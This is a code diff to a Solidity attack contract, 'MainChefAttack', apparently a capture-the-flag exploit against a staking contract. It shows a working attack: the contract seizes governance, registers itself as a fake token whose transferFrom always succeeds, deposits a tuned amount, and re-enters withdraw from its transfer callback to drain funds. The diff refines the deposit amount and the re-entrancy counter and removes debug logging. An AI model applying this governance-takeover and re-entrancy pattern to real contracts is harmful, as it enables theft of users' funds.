@@ -14,16 +14,13 @@ contract MainChefAttack {
     function prepare() public {
         target.setGovernance(address(this));
         target.addToken(IERC20(address(this)));
-        //console.log("EBAAAT 1 %s", target.khinkal().balanceOf(address(this)), target.khinkal().balanceOf(address(target)));
-        target.deposit(1, 1000010638528069504);
-        //console.log("EBAAAT 2 %s", target.khinkal().balanceOf(address(this)), target.khinkal().balanceOf(address(target)));
+        target.deposit(1, 500010319375738048); // (31333333337 + 313337) / 2 * 1e12 / 31333
     }
 
     function hack() public {
         target.withdraw(1);
     }
     
-    //function safeTransferFrom(address a, address b, uint c) external {
     function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
         return true;
     }
@@ -32,11 +29,8 @@ contract MainChefAttack {
         return 1e18;
     }
 
-    //function safeTransfer(address a, uint b) external {
     function transfer(address recipient, uint256 amount) public virtual returns (bool) {
-      //console.log("SCHLYUXA %s", amount);
-      //console.log("EBAAAT %s", target.khinkal().balanceOf(address(target)));
-      if(pwned > 2) return true;
+      if(pwned != 0) return true;
       pwned += 1;
       target.withdraw(1);
       return true;
